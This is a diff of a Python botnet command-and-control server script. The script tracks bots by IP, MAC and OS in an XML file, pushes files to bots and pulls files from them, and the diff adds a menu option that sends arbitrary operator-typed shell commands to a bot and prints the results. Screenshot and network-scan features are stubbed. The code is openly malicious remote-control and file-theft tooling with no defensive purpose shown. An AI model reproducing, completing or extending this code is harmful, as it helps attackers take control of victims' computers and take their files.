@@ -17,7 +17,7 @@ send_port = 6660
 # 5 is max backlogged connections
 server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 server.bind((bind_host, bind_port))
-server.listen(5)
+server.listen(10)
 
 
 def handle_client(client_socket):
@@ -25,9 +25,11 @@ def handle_client(client_socket):
 
     request = client_socket.recv(1024)  # 1024 is the buffer size
 
-    print("\n[*--> Received: %s" % request)
-    if request == '[*-->file_recv':
-        get_file(client_socket)
+    print("[*-->Command Received")
+    print(request)
+
+    if request == '[*-->online':
+        add_bot(client_socket)
 
     client_socket.close()
 
@@ -36,7 +38,7 @@ def handle_client(client_socket):
 def the_server():
     while True:
         client, addr = server.accept()
-        print('\n[*--> Accepted connection from %s:%d' % (addr[0], addr[1]))
+        print('[*--> Accepted connection from %s:%d' % (addr[0], addr[1]))
 
         # Client thread handling for incoming data
         client_handler = threading.Thread(target=handle_client, args=(client,))
@@ -61,16 +63,23 @@ def view_bots():
     # Loop to print the bots
     for bot in bots:
         print('Bot %s' % bot.attributes['id'].value)
-        print('--> IP: %s' % bot.attributes['ip'].value)
-        print('--> MAC: %s' % bot.attributes['mac'].value)
-        print('--> OS: %s' % bot.attributes['os'].value)
+        print('[*--> IP: %s' % bot.attributes['ip'].value)
+        print('[*--> MAC: %s' % bot.attributes['mac'].value)
+        print('[*--> OS: %s' % bot.attributes['os'].value)
         print('-' * 30)
         print('')
 
 
-def add_bot(ip, mac, os):
+def add_bot(client):
     # Add a bot to the database
 
+    client.send('[*-->ok')
+
+    ip = client.recv(1024)
+    mac = client.recv(1024)
+    os = client.recv(1024)
+
+    print('%s, %s, %s' % (ip, mac, os))
     # Open the file as XML, and get all the bots that exist
     bot_list = minidom.parse('bots.xml')
     bots = bot_list.getElementsByTagName('bot')
@@ -87,7 +96,8 @@ def add_bot(ip, mac, os):
     my_file.write(bot_list.toxml())
     my_file.close()
 
-    print('\n*[--> Bot was added')
+    print('*[--> Bot was added')
+    print('>>> \n')
 
 
 def end():
@@ -113,6 +123,7 @@ def menu():
                     'Get File',
                     'Bot Screen Shot',
                     'Bot Scan',
+                    'Bot CMD',
                     'Exit']
 
     # Prints the number (as num) and function name (as func) from array.
@@ -120,7 +131,7 @@ def menu():
     for num, func in enumerate(descriptions):
         print('[%d--> %s' % (num, func))
 
-    choice = input('>>> ')
+    choice = input('>>> \n')
     print('')
     return choice
 
@@ -134,18 +145,17 @@ def send_cmd(cmd):
     # connect the client
     client.connect((send_host, send_port))
 
-    op = subprocess.Popen(cmd, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
+    client.send('[*-->cmd')
 
-    if op:
-        output = str(op.stdout.read())
-        print "Output:", output
-        client.sendall(output)
-    else:
-        error = str(op.stderr.read())
-        print "Error:", error
-        client.sendall(error)
-        # send some data
-        # client.send(cmd)
+    if client.recv(1024) == '[*-->ok':
+        client.send(cmd)
+
+        if client.recv(1024) == '[*-->success':
+            print('[*-->Success')
+            print(client.recv(1024))
+        elif client.recv(1024) == '[*-->failure':
+            print('[*-->Failure')
+            print(client.recv(1024))
 
 
 def send_file(the_file):
@@ -167,6 +177,7 @@ def send_file(the_file):
 
     client.shutdown(socket.SHUT_WR)
     client.close()
+    print('>>> ')
 
 
 def get_file(the_file):
@@ -180,7 +191,6 @@ def get_file(the_file):
     if client.recv(1024) == '[*-->ok':
         client.send('[*-->start')
         print ("Receiving...")
-        the_file = 'FUCK' + the_file
         recv_file = open(the_file, 'wb')
         file_stream = client.recv(1024)
 
@@ -189,7 +199,8 @@ def get_file(the_file):
             recv_file.write(file_stream)
             file_stream = client.recv(1024)
 
-        print('File Get')
+        print('[*-->file get')
+        print('>>> ')
 
 
 # ---------- END FUNCTIONS ---------- #
@@ -246,23 +257,26 @@ while True:
         view_bots()
 
     elif select == 1:  # Send File
-        file_to_send = raw_input('The File >>> ')
+        file_to_send = raw_input('The File >>> \n')
         send_file(file_to_send)
 
     elif select == 2:  # Get File
-        file_to_get = raw_input('The File >>> ')
+        file_to_get = raw_input('The File >>> \n')
         get_file(file_to_get)
 
     elif select == 3:  # Tell bot to Screen Shot
-        print('function 3')
+        print('shooting screen')
         # TODO MAKE THIS WORK
 
     elif select == 4:  # Tell bot to Scan network
-        send_cmd('ping 192.168.0.11')
-        # send_cmd('[*-->ping')
+        print('scanning')
         # TODO MAKE THIS WORK
 
-    elif select == 5:  # Exit the Script
+    elif select == 5:  # Tell bot to run a command
+        cmd_to_run = raw_input('The CMD >>> \n')
+        send_cmd(cmd_to_run)
+
+    elif select == 6:  # Exit the Script
         end()
 
     else:
